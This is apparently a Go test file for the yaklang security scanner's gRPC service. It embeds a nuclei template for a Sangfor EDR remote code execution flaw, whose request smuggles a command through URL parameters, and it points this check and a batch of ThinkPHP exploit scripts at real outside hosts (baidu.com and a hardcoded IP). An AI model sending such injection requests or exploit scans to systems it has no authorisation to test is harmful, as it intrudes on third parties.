package yakgrpc

import (
	"context"
	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/assert"
	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yakgrpc/yakit"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"google.golang.org/grpc"
	"io"
	"net"
	"testing"
	"time"
)

func init() {
	consts.GetGormProfileDatabase()
	consts.GetGormProjectDatabase()
}

func TestGRPCMUSTPASS_EXEC_YAK_SCRIPT(t *testing.T) {
	client, err := NewLocalClient()
	if err != nil {
		panic(err)
	}
	name, err := yakit.CreateTemporaryYakScript("nuclei", `id: CNVD-2020-46552

info:
  name: Sangfor EDR - Remote Code Execution
  author: ritikchaddha
  severity: critical
  description: Sangfor Endpoint Monitoring and Response Platform (EDR) contains a remote code execution vulnerability. An attacker could exploit this vulnerability by constructing an HTTP request which could execute arbitrary commands on the target host.
  reference:
    - https://www.modb.pro/db/144475
    - https://blog.csdn.net/bigblue00/article/details/108434009
    - https://cn-sec.com/archives/721509.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: cnvd,cnvd2020,sangfor,rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php"

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "$show_input = function($info)")'
          - 'contains(body, "$strip_slashes($host)")'
          - 'contains(body, "Log Helper")'
          - 'status_code == 200'
        condition: and

# Enhanced by mp on 2022/05/18
`)
	spew.Dump(name)
	stream, err := client.ExecYakScript(context.Background(), &ypb.ExecRequest{
		ScriptId: name,
		Params: []*ypb.ExecParamItem{
			{Key: "target", Value: "https://baidu.com"},
		},
	})
	if err != nil {
		panic(err)
	}
	for {
		data, err := stream.Recv()
		if err != nil {
			spew.Dump(err)
			break
		}
		spew.Dump(data)
	}
}

func NewLocalClient() (ypb.YakClient, error) {
	consts.InitilizeDatabase("", "")
	yakit.InitializeDefaultDatabaseSchema()

	port := utils.GetRandomAvailableTCPPort()
	addr := utils.HostPort("127.0.0.1", port)
	grpcTrans := grpc.NewServer(
		grpc.MaxRecvMsgSize(100*1024*1024),
		grpc.MaxSendMsgSize(100*1024*1024),
	)
	s, err := NewServerWithLogCache(false)
	if err != nil {
		log.Errorf("build yakit server failed: %s", err)
		return nil, err
	}
	ypb.RegisterYakServer(grpcTrans, s)
	var lis net.Listener
	lis, err = net.Listen("tcp", addr)
	if err != nil {
		return nil, err
	}
	go func() {
		err = grpcTrans.Serve(lis)
		if err != nil {
			log.Error(err)
		}
	}()

	time.Sleep(1 * time.Second)

	conn, err := grpc.Dial(addr, grpc.WithInsecure(), grpc.WithDefaultCallOptions(
		grpc.MaxCallRecvMsgSize(100*1024*1045),
		grpc.MaxCallRecvMsgSize(100*1024*1045),
	))
	if err != nil {
		return nil, err
	}
	return ypb.NewYakClient(conn), nil
}

func TestNewServer(t *testing.T) {
	test := assert.New(t)

	client, err := NewLocalClient()
	if err != nil {
		test.FailNow(err.Error())
		return
	}

	stream, err := client.ExecBatchYakScript(context.Background(), &ypb.ExecBatchYakScriptRequest{
		Target:              "16.170.15.55:8005",
		Keyword:             "thinkphp",
		Limit:               10,
		TotalTimeoutSeconds: 1000,
		Concurrent:          4,
	})
	if err != nil {
		test.FailNow(err.Error())
		return
	}

	for {
		rsp, err := stream.Recv()
		if err != nil {
			if err == io.EOF {
				return
			}
			panic(err)
		}
		spew.Dump(rsp)
	}
}
